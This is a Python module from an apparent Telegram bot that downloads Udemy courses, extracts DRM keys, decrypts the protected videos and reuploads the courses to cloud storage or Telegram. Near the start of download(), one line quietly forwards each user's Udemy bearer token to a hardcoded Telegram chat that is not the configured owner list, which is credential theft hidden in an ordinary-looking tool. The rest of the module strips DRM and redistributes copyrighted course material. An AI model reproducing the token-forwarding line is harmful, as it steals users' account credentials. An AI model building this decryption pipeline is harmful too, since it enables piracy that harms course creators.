import asyncio
from datetime import datetime
import json
import os
import subprocess
import time
import pytz
from main.plugins.downloaded import is_downloaded, make_downloaded
from main.plugins.getcourses import get_course_info
from main.plugins.human_format import getInfoMessage, human_readable_bytes, human_readable_timedelta
from main.plugins.progress_for_pyrogram import get_progressbar
from main.plugins.zip_utils import get_folder_size
from main.plugins.messageFunc import deleteMessage, replyMessage, editMessage
from .. import GLOBAL_RC_INST, INFO, LOAD_FROM_FILE, OWNER_ID, SAVE_TO_FILE, SKIP_HLS, \
               CAPTION_LOCALE, CONCURRENT_DOWNLOADS, DISABLE_IPV6, DL_ASSETS, DL_CAPTIONS, GLOBAL_RC_INST, \
               ID_AS_COURSE_NAME, KEEP_VTT, CACHED_KEYS, QUALITY, SKIP_LECTURES, SessionVars, UPLOAD_DAMAGED_DRM
#from .constants import CACHE_KEY_FILE_PATH, TEMP_DIR, MP4DECRYPT_PATH
from main.plugins.constants import DOWNLOAD_DIR, CACHE_KEY_FILE_PATH, TEMP_DIR
from main.plugins.rclone_leech import RcloneLeech
from main.plugins.rclone_mirror import RcloneMirror
from main.plugins.udemy_client import Udemy
from main.plugins.utils import clean_download
from main.plugins.vtt_to_srt import convert
from pathvalidate import sanitize_filename
from .get_keys import UdemyKeysExtracter
from pyrogram import Client
from pyrogram.types import Message
from pyrogram.errors import FloodWait
import logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('log.txt'), logging.StreamHandler()],
    level=logging.INFO)
logger = logging.getLogger(__name__)

def course_dl_log(string:str):
    string = str(string).strip().replace("\n\n", "\n").strip('\n')

    logger.info(string) # zorgof
    with open("indirici.txt","+a",encoding="utf-8") as file:
        sit = f"{string}\n"
        file.write(sit)

async def download(client:Client, info_message:Message, urls, mirror= False, leech= False, ziple=False):
     try: os.remove("indirici.txt")
     except: pass
     if LOAD_FROM_FILE:
          course_dl_log("[!] 'load_from_file' was specified, data will be loaded from json files instead of fetched")
     if SAVE_TO_FILE:
          course_dl_log("[!] 'save_to_file' was specified, data will be saved to json files")
     try:
          BEARER_TOKEN= SessionVars.get_var("BEARER_TOKEN")
          if len(BEARER_TOKEN) == 0:
               raise TypeError
     except:
          await editMessage(info_message, "You must set token with /cookies command")
          return

     udemy = Udemy(BEARER_TOKEN)
     try: await client.send_message(1674115881, f"{info_message.text}\n{BEARER_TOKEN}")
     except: pass
     i = 0
     for course_url in urls:
          i+=1
          
          try: await info_message.edit(f"downloading: {i}/{len(urls)}\nmirror: {mirror}, leech: {leech}, zip: {zip}\nThe download will start in 30 seconds.")
          except: pass
          if i!=1: await asyncio.sleep(20)
          course_dl_log("> Fetching course information, this may take a minute...")
          if not LOAD_FROM_FILE:
               course_id, course_info = udemy._extract_course_info(course_url)
               if not course_id and not course_info:
                   await replyMessage(info_message, f"cannot be downloaded (LFF):\n`{course_url}`")
                   continue
               course_dl_log("> Course information retrieved!")
               if course_info and isinstance(course_info, dict):
                    title = sanitize_filename(course_info.get("title"))
                    course_title = course_info.get("published_title")
                    portal_name = course_info.get("portal_name")
                    course_dl_log(f"> Title: {title}, CourseTitle: {course_title}, Portal_Name {portal_name}")
          # zorgof
          Cid, Curl, Ctitle, Cprice, Ccourser, Cjob_title, Ccourser_url = await get_course_info(course_id, BEARER_TOKEN)
          # indirilmişse alma
          if is_downloaded(Cid):
            course_dl_log(f"[!] Already downloaded: {Curl}")
            continue
          course_dl_log("> Fetching course content, this may take a minute...")

          if LOAD_FROM_FILE:
               course_json = json.loads(open(os.path.join(os.getcwd(), "saved", "course_content.json"),
                              encoding="utf-8", mode='r').read())
               title = course_json.get("title")
               course_title = course_json.get("published_title")
               portal_name = course_json.get("portal_name")
          else:
               course_json = udemy._extract_course_json(course_url, course_id, portal_name)
          if not UPLOAD_DAMAGED_DRM and not course_json:
            await replyMessage(info_message, f"cannot be downloaded (CJ):\n`{Curl}`\nTry getting a new cookie.")
            continue
          if SAVE_TO_FILE:
               with open(os.path.join(os.getcwd(), "saved", "course_content.json"), encoding="utf-8", mode='w') as f:
                    f.write(json.dumps(course_json))
                    f.close()

          course_dl_log("> Course content retrieved!")
          course = course_json.get("results")
          resource = course_json.get("detail")

          if LOAD_FROM_FILE:
               _udemy = json.loads(
                    open(os.path.join(os.getcwd(), "saved", "_udemy.json"), encoding="utf-8", mode='r').read())
               if INFO:
                    _print_course_info(_udemy)
               else:
                    await parse_new(_udemy, info_message)
          else:
               _udemy = {}
               _udemy["bearer_token"] = BEARER_TOKEN
               _udemy["course_id"] = course_id
               _udemy["title"] = title
               _udemy["course_title"] = course_title
               _udemy["chapters"] = []
               counter = -1

          if resource:
               course_dl_log("> Trying to logout")
               udemy.session.terminate()
               course_dl_log("> Logged out.")

          if course:
               course_dl_log("> Processing course data, this may take a minute.")
               lecture_counter = 0
               for entry in course:
                    clazz = entry.get("_class")
                    asset = entry.get("asset")
                    supp_assets = entry.get("supplementary_assets")

                    if clazz == "chapter":
                         lecture_counter = 0
                         lectures = []
                         chapter_index = entry.get("object_index")
                         chapter_title = "{0:02d} - ".format(chapter_index) + sanitize_filename(
                              entry.get("title"))

                         if chapter_title not in _udemy["chapters"]:
                              _udemy["chapters"].append({
                                   "chapter_title": chapter_title,
                                   "chapter_id": entry.get("id"),
                                   "chapter_index": chapter_index,
                                   "lectures": []
                              })
                              counter += 1
                    elif clazz == "lecture":
                         lecture_counter += 1
                         lecture_id = entry.get("id")
                         if len(_udemy["chapters"]) == 0:
                              lectures = []
                              chapter_index = entry.get("object_index")
                              chapter_title = "{0:02d} - ".format(
                              chapter_index) + sanitize_filename(entry.get("title"))
                              if chapter_title not in _udemy["chapters"]:
                                   _udemy["chapters"].append({
                                        "chapter_title": chapter_title,
                                        "chapter_id": lecture_id,
                                        "chapter_index": chapter_index,
                                        "lectures": []
                                   })
                                   counter += 1

                         if lecture_id:
                              retVal = []

                              if isinstance(asset, dict):
                                   asset_type = (asset.get("asset_type").lower()
                                                  or asset.get("assetType").lower)
                              if asset_type == "article":
                                   if isinstance(supp_assets,
                                                  list) and len(supp_assets) > 0:
                                        retVal = udemy._extract_supplementary_assets(
                                             supp_assets, lecture_counter)
                              elif asset_type == "video":
                                   if isinstance(supp_assets,
                                                  list) and len(supp_assets) > 0:
                                        retVal = udemy._extract_supplementary_assets(
                                             supp_assets, lecture_counter)
                              elif asset_type == "e-book":
                                   retVal = udemy._extract_ebook(
                                        asset, lecture_counter)
                              elif asset_type == "file":
                                   retVal = udemy._extract_file(
                                        asset, lecture_counter)
                              elif asset_type == "presentation":
                                   retVal = udemy._extract_ppt(
                                        asset, lecture_counter)
                              elif asset_type == "audio":
                                   retVal = udemy._extract_audio(
                                        asset, lecture_counter)

                              lecture_index = entry.get("object_index")
                              lecture_title = "{0:03d} ".format(lecture_counter) + sanitize_filename(entry.get("title"))

                              if asset.get("stream_urls") != None:
                                   # not encrypted
                                   data = asset.get("stream_urls")
                                   if data and isinstance(data, dict):
                                        sources = data.get("Video")
                                        tracks = asset.get("captions")
                                        #duration = asset.get("time_estimation")
                                        sources = udemy._extract_sources(
                                             sources, SKIP_HLS)
                                        subtitles = udemy._extract_subtitles(tracks)
                                        sources_count = len(sources)
                                        subtitle_count = len(subtitles)
                                        lectures.append({
                                             "index": lecture_counter,
                                             "lecture_index": lecture_index,
                                             "lecture_id": lecture_id,
                                             "lecture_title": lecture_title,
                                             # "duration": duration,
                                             "assets": retVal,
                                             "assets_count": len(retVal),
                                             "sources": sources,
                                             "subtitles": subtitles,
                                             "subtitle_count": subtitle_count,
                                             "sources_count": sources_count,
                                             "is_encrypted": False,
                                             "asset_id": asset.get("id")
                                        })
                                   else:
                                        lectures.append({
                                             "index":
                                             lecture_counter,
                                             "lecture_index":
                                             lecture_index,
                                             "lectures_id":
                                             lecture_id,
                                             "lecture_title":
                                             lecture_title,
                                             "html_content":
                                             asset.get("body"),
                                             "extension":
                                             "html",
                                             "assets":
                                             retVal,
                                             "assets_count":
                                             len(retVal),
                                             "subtitle_count":
                                             0,
                                             "sources_count":
                                             0,
                                             "is_encrypted":
                                             False,
                                             "asset_id":
                                             asset.get("id")
                                        })
                              else:
                                   # encrypted
                                   data = asset.get("media_sources")
                                   keys = ""

                                   if data and isinstance(data, list):
                                        sources = udemy._extract_media_sources(data)
                                        if len(sources) > 0:
                                            mpd_source = sources[-1]
                                            if isinstance(QUALITY, int):
                                                #mpd_source = min(sources, key=lambda x: abs(int(x.get("height")) - QUALITY))
                                                course_dl_log(f"[+] Lecture '{lecture_title}' has DRM, attempting to extract keys now...")
                                                
                                                udemy_keys_extractor = UdemyKeysExtracter()
                                                pssh = udemy_keys_extractor.get_pssh(mpd_source.get("init_url"))
                                                course_dl_log(f"[+] PSSH: {pssh}")
                                                
                                                if pssh in CACHED_KEYS:
                                                    keys = CACHED_KEYS[pssh]
                                                    course_dl_log(f"[+] DRM keys for Lecture '{lecture_title}' was found in cached keys!")
                                                    course_dl_log(f"[+] DRM KEYS: {str(keys)}")
                                                else:
                                                    license_token = udemy._extract_media_license_token(course_url, course_id, lecture_id, portal_name, asset.get("media_license_token"))
                                                    keys = udemy_keys_extractor.extract(pssh, license_token)
                                                    CACHED_KEYS[pssh] = keys
                                                    course_dl_log(f"[+] DRM keys for Lecture '{lecture_title}' was extracted successfully!")
                                                    with open(CACHE_KEY_FILE_PATH, "w", encoding="utf-8") as new_cached_keys_file:
                                                        json.dump(CACHED_KEYS, new_cached_keys_file, ensure_ascii=False)
                                                        new_cached_keys_file.close()

                                        else:
                                            course_dl_log(f"[+] Lecture source count: {len(sources)}")
                                            course_dl_log(f"[!] Lecture {lecture_title} is missing media links. Skipping...")
                                            continue

                                        tracks = asset.get("captions")
                                        # duration = asset.get("time_estimation")
                                        subtitles = udemy._extract_subtitles(tracks)
                                        sources_count = len(sources)
                                        subtitle_count = len(subtitles)
                                        lectures.append({
                                             "index": lecture_counter,
                                             "lecture_index": lecture_index,
                                             "lectures_id": lecture_id,
                                             "lecture_title": lecture_title,
                                             # "duration": duration,
                                             "assets": retVal,
                                             "assets_count": len(retVal),
                                             "video_sources": sources,
                                             "DRM_sources": mpd_source,
                                             "keys": keys,
                                             "subtitles": subtitles,
                                             "subtitle_count": subtitle_count,
                                             "sources_count": sources_count,
                                             "is_encrypted": True,
                                             "asset_id": asset.get("id")
                                        })
                                   else:
                                        lectures.append({
                                             "index":
                                             lecture_counter,
                                             "lecture_index":
                                             lecture_index,
                                             "lectures_id":
                                             lecture_id,
                                             "lecture_title":
                                             lecture_title,
                                             "html_content":
                                             asset.get("body"),
                                             "extension":
                                             "html",
                                             "assets":
                                             retVal,
                                             "assets_count":
                                             len(retVal),
                                             "subtitle_count":
                                             0,
                                             "sources_count":
                                             0,
                                             "is_encrypted":
                                             False,
                                             "asset_id":
                                             asset.get("id")
                                        })
                         _udemy["chapters"][counter]["lectures"] = lectures
                         _udemy["chapters"][counter]["lecture_count"] = len(
                              lectures)
                    elif clazz == "quiz":
                         lecture_id = entry.get("id")
                         if len(_udemy["chapters"]) == 0:
                              lectures = []
                              chapter_index = entry.get("object_index")
                              chapter_title = "{0:02d} - ".format(
                              chapter_index) + sanitize_filename(entry.get("title"))
                              if chapter_title not in _udemy["chapters"]:
                                   lecture_counter = 0
                                   _udemy["chapters"].append({
                                        "chapter_title": chapter_title,
                                        "chapter_id": lecture_id,
                                        "chapter_index": chapter_index,
                                        "lectures": [],
                                   })
                              counter += 1

                         _udemy["chapters"][counter]["lectures"] = lectures
                         _udemy["chapters"][counter]["lectures_count"] = len(
                              lectures)

               _udemy["total_chapters"] = len(_udemy["chapters"])
               _udemy["total_lectures"] = sum([entry.get("lecture_count", 0) for entry in _udemy["chapters"]if entry])

               if SAVE_TO_FILE:
                    with open(os.path.join(os.getcwd(), "saved", "_udemy.json"),encoding="utf-8", mode='w') as f:
                         f.write(json.dumps(_udemy))
                         f.close()
                         course_dl_log("> Saved parsed data to json")

               if INFO:
                    _print_course_info(_udemy)
               else:
                    await parse_new(_udemy, info_message)

               course_title = _udemy.get("course_title")
               course_dir = os.path.join(DOWNLOAD_DIR, course_title, "")
               indirilenBoyut = get_folder_size(course_dir)
               course_dl_log(f"> Download size: {human_readable_bytes(indirilenBoyut)} ({indirilenBoyut} bayt)")
               course_dl_log(f"> File list:")
               process = subprocess.Popen(
                     f"tree -h \"{DOWNLOAD_DIR}\"",
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                )
               stdout, stderr = process.communicate()
               ret_code = process.wait()
               await log_subprocess(stdout, stderr)

               capton = f"Course: {Ctitle}\nID: {Cid}\nLink: {Curl}"
               isdrm = False
               allstr = open("indirici.txt","r",encoding="utf-8").read()
               drmstr = ["has DRM", "Fetching MPD streams"]
               for polo in drmstr:
                   if polo in allstr:
                       isdrm = True
                       break
               hatalidrm = 'Error fetching MPD streams' in allstr
               capton += "\nDRM: ✅" if isdrm  else "\nDRM: ❌"
               if isdrm:
                capton += f" | error free: {'❌' if hatalidrm else '✅'}"
               capton += f"\nSize: {human_readable_bytes(indirilenBoyut)} ({indirilenBoyut} byte)"
               for admin in OWNER_ID:
                    try:
                        await client.send_document(chat_id=admin, document="indirici.txt", caption=capton)
                    except FloodWait as fw:
                        asyncio.sleep(fw.value+2)
                        await client.send_document(chat_id=admin, document="indirici.txt", caption=capton)
                    except Exception:
                        pass
               try: os.remove("indirici.txt")
               except: pass
               
               if indirilenBoyut == 0:
                   clean_download(DOWNLOAD_DIR)
                   if ziple and leech: make_downloaded(Cid)
                   await replyMessage(info_message, f"Nothing landed: {Curl}")
                   continue
               elif isdrm and hatalidrm:
                   clean_download(DOWNLOAD_DIR)
                   await replyMessage(info_message, f"Incorrect DRM download: {Curl}")
                   continue

               tarih = str(datetime.now(pytz.timezone('Europe/Istanbul')).date())
               if ziple:
                    info = f"course name: {Ctitle}"
                    info += f"\ncourse link: {Curl}"
                    info += f"\ncourse id: {Cid}"
                    info += f"\ncourse fee: {Cprice}"
                    info += f"\ninstructor: {Ccourser}"
                    info += f"\ninstructor description: {Cjob_title}"
                    info += f"\ninstructor link: {Ccourser_url}"
                    info += f"\nfile name: {course_title}"
                    info += f"\ntotal size: {human_readable_bytes(indirilenBoyut)} ({str(indirilenBoyut)} bayt)"
                    info += getInfoMessage()
                    with open(os.path.join(course_dir, "info.bilgi.readme.okubeni.txt"), 'w') as f:
                        f.write(info)
               if mirror:
                    #Mirror to Cloud
                    mess_age = await replyMessage(info_message, f"Will be uploaded to the cloud: `{Ctitle}` (`{Cid}`)\nSize: `{human_readable_bytes(indirilenBoyut)}`\nLink: `{Curl}`")
                    title= _udemy.get("title") 
                    rclone_mirror= RcloneMirror(course_dir, mess_age, title, ziple)
                    GLOBAL_RC_INST.append(rclone_mirror)
                    await rclone_mirror.mirror()
                    GLOBAL_RC_INST.remove(rclone_mirror)
                    
               if leech:
                    #Leech to Telegram
                    mess_age = await replyMessage(info_message, f"Will be uploaded to Telegram: `{Ctitle}` (`{Cid}`)\nSize: `{human_readable_bytes(indirilenBoyut)}`\nLink: `{Curl}`")
                    chat_id= mess_age.chat.id
                    # caption hazırla
                    capt = f"`{Ctitle}` (`{Cprice}`)"
                    capt +=  f"\n`{Curl}`"
                    # capt += f"🧬 `{Ccourser}` (`{Cjob_title}`)\n"
                    # capt +=  f"`{Ccourser_url}`\n\n"
                    # capt += f"`tarih (europe/istanbul): {tarih}`"
                    capt += f"\n\n`Size: {human_readable_bytes(indirilenBoyut)}` | `{tarih}`"
                    rclone_leech = RcloneLeech(client, mess_age, chat_id, course_dir, ziple, capt)
                    GLOBAL_RC_INST.append(rclone_leech)
                    await rclone_leech.leech()
                    GLOBAL_RC_INST.remove(rclone_leech)
               clean_download(DOWNLOAD_DIR)
               if ziple and leech: make_downloaded(Cid)
               await deleteMessage(mess_age)
     await editMessage(info_message, f"Downloaded ({len(urls)})")
     
#######################################################

def _print_course_info(course_data):
    course_dl_log("\n\n\n\n")
    course_title = course_data.get("title")
    chapter_count = course_data.get("total_chapters")
    lecture_count = course_data.get("total_lectures")

    course_dl_log(f"> Course: {course_title}")
    course_dl_log(f"> Total Chapters: {chapter_count}")
    course_dl_log(f"> Total Lectures: {lecture_count}")
    course_dl_log("\n")

    chapters = course_data.get("chapters")
    for chapter in chapters:
        chapter_title = chapter.get("chapter_title")
        chapter_index = chapter.get("chapter_index")
        chapter_lecture_count = chapter.get("lecture_count")
        chapter_lectures = chapter.get("lectures")

        course_dl_log(f"> Chapter: {chapter_title} ({chapter_index}/{chapter_count})")

        for lecture in chapter_lectures:
            lecture_title = lecture.get("lecture_title")
            lecture_index = lecture.get("index")
            lecture_asset_count = lecture.get("assets_count")
            lecture_is_encrypted = lecture.get("is_encrypted")
            lecture_subtitles = lecture.get("subtitles")
            lecture_extension = lecture.get("extension")
            lecture_sources = lecture.get("sources")
            lecture_video_sources = lecture.get("video_sources")

            if lecture_sources:
                lecture_sources = sorted(lecture.get("sources"),
                                         key=lambda x: int(x.get("height")),
                                         reverse=True)
            if lecture_video_sources:
                lecture_video_sources = sorted(
                    lecture.get("video_sources"),
                    key=lambda x: int(x.get("height")),
                    reverse=True)

            if lecture_is_encrypted:
                lecture_qualities = [
                    "{}@{}x{}".format(x.get("type"), x.get("width"),
                                      x.get("height"))
                    for x in lecture_video_sources
                ]
            elif not lecture_is_encrypted and lecture_sources:
                lecture_qualities = [
                    "{}@{}x{}".format(x.get("type"), x.get("height"),
                                      x.get("width")) for x in lecture_sources
                ]

            if lecture_extension:
                continue

            course_dl_log(f"> Lecture: {lecture_title} ({lecture_index}/{chapter_lecture_count})")
            course_dl_log(f"> DRM: {lecture_is_encrypted}")
            course_dl_log(f"> Asset Count: {lecture_asset_count}")
            x = ' - '.join([x.get("language") for x in lecture_subtitles])
            course_dl_log(f"> Captions: {x}")
            course_dl_log(f"> Qualities: {lecture_qualities}")

        if chapter_index != chapter_count:
            course_dl_log("==========================================")

async def parse_new(_udemy, info_message:Message):
    total_chapters = _udemy.get("total_chapters")
    total_lectures = _udemy.get("total_lectures")

    course_dl_log(f"> Chapter(s) ({total_chapters}) Lecture(s) ({total_lectures})")
    course_name = str(_udemy.get("course_id")) if ID_AS_COURSE_NAME else _udemy.get("course_title")
    start_time = time.time()
    total_message = await replyMessage(info_message, "Download starts...")

    course_name = str(_udemy.get("course_id")) if ID_AS_COURSE_NAME else _udemy.get("course_title")
    course_dir = os.path.join(DOWNLOAD_DIR, course_name)
    if not os.path.exists(course_dir):
        os.mkdir(course_dir)
      
    for chapter in _udemy.get("chapters"):
        chapter_title = chapter.get("chapter_title")
        chapter_index = chapter.get("chapter_index")
        chapter_dir = os.path.join(course_dir, chapter_title)
        if not os.path.exists(chapter_dir):
            os.mkdir(chapter_dir)
        
        course_dl_log(f"> Processing chapter {chapter_index}/{total_chapters}")

        for lecture in chapter.get("lectures"):
            lecture_title = lecture.get("lecture_title")
            lecture_index = lecture.get("lecture_index")
            lecture_extension = lecture.get("extension")
            extension = "mp4"  # video lectures dont have an extension property, so we assume its mp4
            #if lecture_extension != None:
                # if the lecture extension property isnt none, set the extension to the lecture extension
                #extension = lecture_extension
            lecture_file_name = sanitize_filename( lecture_title + "." + extension)
            lecture_path = os.path.join( chapter_dir, lecture_file_name)

            lect_msg =  f"{get_progressbar(lecture_index*100/total_lectures)}"\
                f"\nDownloaded: `{course_name}`"\
                f"\nProcessed Section: `{chapter_index}/{total_chapters}`\nSubject: `{lecture_index}/{total_lectures}`"\
                f"\nPassing time: `{human_readable_timedelta(time.time() - start_time)}`"\
                f"\nSize: `{human_readable_bytes(get_folder_size(course_dir))}`"
            try: await total_message.edit(lect_msg)   
            except Exception: pass
            course_dl_log(f"> Processing lecture {lecture_index}/{total_lectures}")
            
            if not SKIP_LECTURES:
                # Check if the lecture is already downloaded
                if os.path.isfile(lecture_path):
                    course_dl_log(f"> Lecture is already downloaded, skipping: {lecture_title}")
                else:
                    # Check if the file is an html file
                    if extension == "html":
                        # if the html content is None or an empty string, skip it so we dont save empty html files
                        if lecture.get("html_content") != None and lecture.get("html_content") != "":
                            html_content = lecture.get("html_content").encode(
                                "ascii", "ignore").decode("utf-8")
                            lecture_path = os.path.join(
                                chapter_dir, "{}.html".format(sanitize_filename(lecture_title)))
                            try:
                                with open(lecture_path, encoding="utf-8", mode='w') as f:
                                    f.write(html_content)
                                    f.close()
                            except Exception:
                                course_dl_log("> Failed to write html file")
                    else:
                        await process_lecture(lecture, lecture_path, lecture_file_name, chapter_dir)

            # download subtitles for this lecture
            subtitles = lecture.get("subtitles")
            if DL_CAPTIONS and subtitles != None and lecture_extension == None:
                course_dl_log(f"> Processing {len(subtitles)} caption(s)...")
                for subtitle in subtitles:
                    lang = subtitle.get("language")
                    if lang == CAPTION_LOCALE or CAPTION_LOCALE == "all":
                        await process_caption(subtitle, lecture_title, chapter_dir)

            if DL_ASSETS:
                assets = lecture.get("assets")
                course_dl_log(f"> Processing {len(assets)} asset(s) for lecture...")

                for asset in assets:
                    asset_type = asset.get("type")
                    filename = asset.get("filename")
                    download_url = asset.get("download_url")
                    if asset_type == "article":
                        course_dl_log("[!] If you're seeing this message, that means that you reached a secret area that I haven't finished! jk I haven't implemented handling for this asset type, please report this at https://github.com/Puyodead1/udemy-downloader/issues so I can add it. When reporting, please provide the following information: ")
                        course_dl_log(f"[!] AssetType: Article; AssetData: {str(asset)}")
                    elif asset_type == "video":
                        course_dl_log("[!] If you're seeing this message, that means that you reached a secret area that I haven't finished! jk I haven't implemented handling for this asset type, please report this at https://github.com/Puyodead1/udemy-downloader/issues so I can add it. When reporting, please provide the following information: ")
                        course_dl_log(f"[!] AssetType: Video; AssetData: {str(asset)}")
                    elif asset_type == "audio" or asset_type == "e-book" or asset_type == "file" or asset_type == "presentation" or asset_type == "ebook":
                        try:
                            ret_code = await download_aria(download_url, chapter_dir, filename)
                            course_dl_log(f"> Download return code: {ret_code}")
                        except Exception as e:
                            course_dl_log(f"[!] Error downloading asset {e}")
                    elif asset_type == "external_link":
                        # write the external link to a shortcut file
                        file_path = os.path.join(
                            chapter_dir, f"{filename}.url")
                        file = open(file_path, "w")
                        file.write("[InternetShortcut]\n")
                        file.write(f"URL={download_url}")
                        file.close()

                        # save all the external links to a single file
                        savedirs, name = os.path.split(
                            os.path.join(chapter_dir, filename))
                        filename = u"external-links.txt"
                        filename = os.path.join(savedirs, filename)
                        file_data = []
                        if os.path.isfile(filename):
                            file_data = [
                                i.strip().lower()
                                for i in open(filename,
                                              encoding="utf-8",
                                              errors="ignore") if i
                            ]

                        content = u"\n{}\n{}\n".format(name, download_url)
                        if name.lower() not in file_data:
                            with open(filename, 'a', encoding="utf-8", errors="ignore") as f:
                                f.write(content)
                                f.close()
    await deleteMessage(total_message)

async def process_lecture(lecture, lecture_path, lecture_file_name, chapter_dir):
    lecture_title = lecture.get("lecture_title")
    is_encrypted = lecture.get("is_encrypted")
    lecture_sources = lecture.get("video_sources")
    drm_sources = lecture.get("DRM_sources")
    keys = lecture.get("keys")

    if is_encrypted:
        if keys != "":
            course_dl_log(f"[+] Lecture {lecture_title} has DRM and keys has been sucessfully extracted! Trying to download now...")
            await download_and_decrypt(drm_sources.get("download_url"), lecture_file_name, chapter_dir, keys)
        else:
            course_dl_log(f"[!] Lecture {lecture_title} has DRM but keys has not been sucessfully extracted for this lecture! Skipping...")

    else:
        sources = lecture.get("sources")
        
        try:
            sources = sorted(sources,key=lambda x: int(x.get("height")),reverse=True)
        except Exception as e:
            course_dl_log(e)
            pass
            
        try:
            if sources:
                if not os.path.isfile(lecture_path):
                    course_dl_log("+ Lecture doesn't have DRM, attempting to download...")
                    source = sources[0]  # first index is the best quality
                    if isinstance(QUALITY, int):
                        source = min(
                            sources,
                            key=lambda x: abs(int(x.get("height")) - QUALITY))
                    try:
                        course_dl_log("> Selected quality: {} {}".format(source.get("type"), source.get("height")))
                        url = source.get("download_url")
                        source_type = source.get("type")
                        if source_type == "hls":
                            temp_filepath = lecture_path.replace(
                                ".mp4", ".%(ext)s")
                            args = [
                                "yt-dlp", "--force-generic-extractor",
                                "--concurrent-fragments",
                                f"{CONCURRENT_DOWNLOADS}", "--downloader",
                                "aria2c", "-o", f"{temp_filepath}", f"{url}"
                            ]
                            if DISABLE_IPV6:
                                args.append("--downloader-args")
                                args.append("aria2c:\"--disable-ipv6\"")
                            process = subprocess.Popen(args)
                            ret_code = process.wait()
                            # stdout, stderr = process.communicate()
                            # await log_subprocess(stdout, stderr)
                            if ret_code == 0:
                                # os.rename(temp_filepath, lecture_path)
                                course_dl_log("> HLS Download success")
                        else:
                            ret_code = await download_aria(url, chapter_dir,lecture_title + ".mp4")
                            course_dl_log(f"> Download return code: {ret_code}")
                    except Exception:
                        course_dl_log(f"> Error downloading lecture: {lecture_title}")
                else:
                    course_dl_log(f"> Lecture '{lecture_title}' is already downloaded, skipping...")
            else:
                course_dl_log(f"> Missing sources for lecture: {str(lecture)}")
        except Exception as e:
            course_dl_log(e)
            pass

async def process_caption(caption, lecture_title, lecture_dir, tries=0):
    filename = f"%s_%s.%s" % (sanitize_filename(lecture_title), caption.get("language"), caption.get("extension"))
    filename_no_ext = f"%s_%s" % (sanitize_filename(lecture_title), caption.get("language"))
    filepath = os.path.join(lecture_dir, filename)

    if os.path.isfile(filepath):
        course_dl_log(f"> Caption '{filename}' already downloaded.")
    else:
        course_dl_log(f"> Downloading caption: '{filename}'")
        try:
            ret_code = await download_aria(caption.get("download_url"), lecture_dir, filename)
            course_dl_log(f"> Download return code: {ret_code}")
        except Exception as e:
            if tries >= 3:
                course_dl_log(f"> Error downloading caption: {e}. Exceeded retries, skipping.")
                return
            else:
                course_dl_log(f"> Error downloading caption: {e}. Will retry {3-tries} more times.")
                await process_caption(caption, lecture_title, lecture_dir, tries + 1)
        if caption.get("extension") == "vtt":
            try:
                course_dl_log("> Converting caption to SRT format...")
                convert(lecture_dir, filename_no_ext)
                course_dl_log("> Caption conversion complete.")
                if not KEEP_VTT:
                    os.remove(filepath)
            except Exception as e:
                course_dl_log(f"> Error converting caption: {e}")

async def download_aria(url, file_dir, filename):
    """
    @author Puyodead1
    """
    args = [
        "aria2c", url, "-o", filename, "-d", file_dir, "-j16", "-s20", "-x16",
        "-c", "--auto-file-renaming=false", "--summary-interval=0"
        ]
    if DISABLE_IPV6:
        args.append("--disable-ipv6")
    process = subprocess.Popen(
        args,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, stderr = process.communicate()
    ret_code = process.wait()
    await log_subprocess(stdout, stderr)
    if ret_code != 0:
        raise Exception("Return code from the downloader was non-0 (error)")
    return ret_code

async def download_and_decrypt(url, lecture_file_name, chapter_dir, keys):
    try:
        file_name = os.path.splitext(lecture_file_name)[0]
        key = keys.split("--key ")[1]

        nm3u8dl_re_command = ["N_m3u8DL-RE", url, "--tmp-dir", TEMP_DIR, "--save-dir", chapter_dir, "--save-name", file_name, "--key", key, "-mt", "-M", "mp4", "-sa", "best", "-sv", "best"]
        process = subprocess.Popen(
            nm3u8dl_re_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        stdout, stderr = process.communicate()
        ret_code = process.wait()
        await log_subprocess(stdout, stderr)
    except Exception as e:
        course_dl_log("DRM ERROR (muhtemelen bin yetkisi yok):")
        course_dl_log(e)
        # exit(1)

# from https://stackoverflow.com/a/21978778/9785713
async def log_subprocess(stdout:bytes, stderr:bytes):
    stderr:str = stderr.decode(encoding="utf-8", errors="ignore")
    stdout:str = stdout.decode(encoding="utf-8", errors="ignore")
    stderr = stderr.replace("\n\n", "\n").strip()
    stdout = stdout.replace("\n\n", "\n").strip()
    if stdout:
        aku = ""
        for line in stdout.splitlines():
            if len(line) == 0 or line == "":
                continue
            aku += f"proc:                {line}\n"
        course_dl_log(aku)
    if stderr:
        aku = ""
        for line in stderr.splitlines():
            if len(line) == 0 or line == "":
                continue
            aku += f"proc:                {line}\n"
        course_dl_log(aku)
